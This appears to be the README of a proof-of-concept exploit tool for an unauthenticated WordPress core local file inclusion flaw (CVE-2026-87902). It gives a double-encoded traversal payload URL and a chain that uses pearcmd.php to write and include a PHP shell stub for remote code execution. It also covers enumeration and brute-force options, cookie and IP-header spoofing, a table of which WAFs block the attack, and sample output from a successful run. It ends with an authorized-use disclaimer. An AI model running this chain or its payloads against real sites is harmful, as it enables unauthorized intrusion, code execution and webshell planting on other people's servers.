# CVE-2026-87902 — WordPress Core LFI via `locate_template()`

Unauthenticated Local File Inclusion (LFI) in WordPress core `locate_template()`.  
Leads to Remote Code Execution (RCE) via PHP PEAR `pearcmd.php` when `register_argc_argv=On`.

## Affected Versions

| Software | Version |
|---|---|
| WordPress | <= 7.1.1 |
| PHP | Any (requires `register_argc_argv=On`) |

Fixed in WordPress **7.1.2**.

---

## Technical Background

`locate_template()` resolves a caller-supplied template name without verifying the resolved path stays within the active theme directory. A double URL-encoded path traversal sequence bypasses the single `urldecode()` sanitization:

```
%252e%252e  →  (HTTP layer decodes %25 → %)  →  %2e%2e  →  (WP urldecode)  →  ..
```

Single encoding (`%2e%2e`) is consumed by the HTTP layer and never reaches WordPress.

The LFI is triggered via the `pagename` query parameter:

```
/?page_id=2&pagename=templates%252F%252e%252e%252F%252e%252e%252F..%252Fusr%252Fshare%252Fphp%252Fpearcmd+config-show
```

With `register_argc_argv=On`, PHP maps the URL query string to `$argv`, allowing `pearcmd.php` to accept commands. The `config-create` command writes a PHP stub to a target path, which is then included via a second LFI request.

---

## Requirements

- Python 3.8+
- `requests` library

```bash
pip install requests
```

---

## Usage

### Basic scan (auto-detect everything)

```bash
python3 poc.py https://target.com
```

### Verbose output

```bash
python3 poc.py https://target.com -v
```

### Thorough mode (probe all 32 known themes + brute-force page IDs 1–200)

```bash
python3 poc.py https://target.com --thorough -v
```

### Attempt RCE after LFI confirmed

```bash
python3 poc.py https://target.com --rce -v
```

### RCE with custom PHP stub write path

```bash
python3 poc.py https://target.com --rce --write-path /var/www/html/wp-content/uploads/shell.php -v
```

### JSON output (for scripting / chaining)

```bash
python3 poc.py https://target.com --json
python3 poc.py https://target.com --json > result.json
```

### Override specific phase values (skip discovery)

```bash
# Use a known page_id directly (skip page discovery)
python3 poc.py https://target.com --page-id 5

# Use a known theme name (skip theme enumeration)
python3 poc.py https://target.com -t astra

# Use a specific traversal depth only
python3 poc.py https://target.com -d 9

# Combine overrides
python3 poc.py https://target.com --page-id 5 -t astra -d 9 --rce -v
```

### Custom port (Apache backend behind LiteSpeed reverse proxy)

```bash
python3 poc.py https://target.com --port 8080 -v
```

### Authenticated scan (with session cookie)

```bash
python3 poc.py https://target.com --cookie "wordpress_logged_in_xxx=user%7C..." -v
```

### Custom HTTP headers

```bash
python3 poc.py https://target.com -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1"
```

### Increase thread count for faster scanning

```bash
python3 poc.py https://target.com --thorough --threads 20 -v
```

---

## All Flags

| Flag | Default | Description |
|---|---|---|
| `target` | (required) | Target base URL |
| `--rce` | off | Attempt RCE via pearcmd `config-create` after LFI confirmed |
| `--write-path PATH` | `/tmp/wp_shell.php` | PHP stub write path for RCE stage |
| `--thorough` | off | Probe all known themes + brute-force page IDs 1–200 |
| `--threads N` | `10` | Worker thread count |
| `--port N` | auto | Override destination port |
| `--cookie STR` | — | Cookie header value |
| `-H HEADER` | — | Extra HTTP header (repeatable) |
| `--json` | off | Output JSON result |
| `-v / --verbose` | off | Verbose per-request output |
| `--page-id N` | — | Override: skip page discovery, use this page_id |
| `-t / --theme NAME` | — | Override: skip theme enum, use this theme |
| `-d / --depth N` | — | Override: use only this traversal depth |

---

## Scan Phases

```
Phase 1  WordPress version + server header detection
Phase 2  Theme enumeration
           └─ active theme from HTML source
           └─ installed themes from /wp-content/themes/ directory listing
           └─ [--thorough] probe all 32 known popular themes
Phase 3  Page discovery
           └─ REST API  /wp-json/wp/v2/pages
           └─ Sitemap   /sitemap.xml, /wp-sitemap.xml
           └─ [--thorough] brute-force page_id 1–200
Phase 4  Template validation
           └─ keep only pages with default/empty template
           └─ skip Elementor, Divi, and other builder templates
Phase 5  LFI probe  (threaded)
           └─ combos: pages × themes × depths [7–11] × 24 pearcmd paths
           └─ confirms via PEAR output markers only (no false positives)
Phase 6  RCE chain  [--rce]
           └─ Stage 1: pearcmd config-create writes PHP stub
           └─ Stage 2: LFI includes stub, executes id command
           └─ confirms via uid= output pattern
```

---

## Exit Codes

| Code | Meaning |
|---|---|
| `0` | LFI confirmed |
| `1` | LFI not confirmed (or WAF blocked) |

---

## WAF Compatibility

| Environment | LFI via HTTP | Notes |
|---|---|---|
| Apache / Nginx (no WAF) | **Works** | Double encoding reaches PHP |
| LiteSpeed + Imunify360 | **Blocked** | WAF drops traversal at kernel level |
| Cloudflare WAF | **Blocked** | Managed rule blocks `%25` sequences |
| cPanel + Apache (no WAF) | **Works** | Most common exploitable config |

When WAF is detected, the script reports the type and exits cleanly — no false positives.

---

## Example Output

```
╔═══════════════════════════════════════════════════════════════╗
║  CVE-2026-87902 — WordPress LFI via locate_template()        ║
║  Affects: WordPress <= 7.1.1  |  Unauthenticated             ║
╚═══════════════════════════════════════════════════════════════╝

[*] Target  : https://target.com
[*] Threads : 10  Thorough: False

[Phase 1] WordPress detection
  [*] WP version: 6.7.2  Server: Apache/2.4.62

[Phase 2] Theme enumeration
  [+] Active theme from HTML: astra
    [*] Theme page-dir: page-templates (HTTP 403)
  [*] Total themes: 1

[Phase 3] Page discovery
  [*] REST API: found 4 pages

[Phase 4] Template validation (4 pages)
  [-] Skipping page 3 (contact): template=elementor_header_footer
  [*] Exploitable pages (default template): 3

[Phase 5] LFI probe
  [*] LFI combos: 360 (3 pages x 1 themes x 5 depths x 24 pearcmd paths)
  [+] LFI CONFIRMED: page_id=2 theme=astra depth=8 pear=/opt/alt/php81/usr/share/pear/pearcmd

=================================================================
TARGET : https://target.com
WP VER : 6.7.2
SERVER : Apache/2.4.62
THEMES : 1
PAGES  : 4

[+] LFI CONFIRMED
    Page ID : 2 (sample-page)
    Theme   : astra (suffix=templates)
    Depth   : 8
    Pear    : /opt/alt/php81/usr/share/pear/pearcmd
    URL     : https://target.com/?page_id=2&pagename=templates%252F...
=================================================================
```

---

## Disclaimer

This tool is intended for authorized security testing, CTF challenges, and educational research only. Use only against systems you own or have explicit written permission to test. Unauthorized use is illegal.
